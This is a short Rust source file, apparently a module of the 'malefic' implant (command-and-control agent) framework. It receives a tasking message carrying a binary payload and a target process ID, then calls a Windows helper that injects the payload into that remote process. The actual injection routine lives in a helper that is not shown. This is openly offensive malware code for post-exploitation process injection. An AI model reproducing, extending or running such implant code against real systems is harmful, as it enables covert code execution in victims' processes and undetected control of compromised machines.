use async_trait::async_trait;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_trait::module_impl;
use crate::{check_field, check_request, Input, Module, Output, TaskResult};

pub struct Inject {}

#[async_trait]
#[module_impl("inject")]
impl Module for Inject {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> crate::Result {
        let req = check_request!(receiver, Body::Inject)?;

        let bin = check_field!(req.bin)?;
        malefic_helper::win::process::remote_inject(req.pid, &*bin)?;

        Ok(TaskResult::new(id))
    }
}
